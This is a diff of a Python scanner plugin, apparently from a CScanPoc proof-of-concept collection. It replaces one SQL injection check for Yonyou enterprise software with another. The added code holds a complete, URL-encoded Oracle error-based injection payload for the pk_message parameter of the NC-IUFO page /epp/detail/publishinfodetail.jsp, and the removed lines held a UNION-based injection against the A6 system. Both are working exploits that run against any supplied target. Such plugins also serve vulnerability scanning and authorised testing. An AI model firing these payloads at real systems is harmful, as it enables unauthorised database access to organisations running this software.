@@ -1,21 +1,21 @@
 # coding: utf-8
 import requests
 
-
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
 
 class Vuln(ABVuln):
-    vuln_id = 'Yonyou_0101' # 平台漏洞编号，留空
-    name = '用友致远A6协同系统 /isNotInTable.jsp SQL Injection' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
+    vuln_id = 'Yonyou_0103' # 平台漏洞编号，留空
+    name = '用友NC-IUFO系统 /epp/detail/publishinfodetail.jsp SQL注入' # 漏洞名称
+    level = VulnLevel.MED # 漏洞危害级别
     type = VulnType.INJECTION # 漏洞类型
-    disclosure_date = '2015-08-31'  # 漏洞公布时间
+    disclosure_date = '2015-04-01'  # 漏洞公布时间
     desc = '''
-    用友 mysql+jsp 注入
+    param `pk_message` is not filterd,
+    用友NC-IUFO系统 /epp/detail/publishinfodetail.jsp SQL注入。
     ''' # 漏洞描述
-    ref = 'Unknown' # 漏洞来源http://wooyun.org/bugs/wooyun-2010-0110312
+    ref = 'Unknown' # 漏洞来源http://www.wooyun.org/bugs/wooyun-2014-089208
     cnvd_id = 'Unknown' # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
     product = 'Yonyou'  # 漏洞应用名称
@@ -23,7 +23,7 @@ class Vuln(ABVuln):
 
 
 class Poc(ABPoc):
-    poc_id = '1f9b0911-3a30-40e6-8142-ddd7599f322a' # 平台 POC 编号，留空
+    poc_id = 'a72a16bf-99ba-4baf-b55f-4c5bc200349f' # 平台 POC 编号，留空
     author = 'hyhmnn'  # POC编写者
     create_date = '2018-05-29' # POC创建时间
 
@@ -35,10 +35,16 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                     target=self.target, vuln=self.vuln))
             url = self.target
-            verify_url=('%s/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids='
-                        '(17) union all select md5(3.1415)#') % url
+            url = url if url[-1] != '/' else url[:-1]
+            payload = ("/epp/detail/publishinfodetail.jsp?pk_message=1002F410000000019JNX%27%20"
+                       "AND%203814=(SELECT%20UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(99)||"
+                       "CHR(122)||CHR(103)||CHR(113)||(SELECT%20(CASE%20WHEN%20(3814=3814)%20THEN"
+                       "%201%20ELSE%200%20END)%20FROM%20DUAL)||CHR(113)||CHR(110)||CHR(111)||CHR(105)"
+                       "||CHR(113)||CHR(62)))%20FROM%20DUAL)%20AND%20%27vdoA%27=%27vdoA")
+            verify_url = url + payload
             req = requests.get(verify_url)
-            if req.status_code != 404 and '63e1f04640e83605c1d177544a5a0488' in req.content:
+            content = req.content
+            if req.status_code == 500 and 'qczgq1qnoiq' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
             
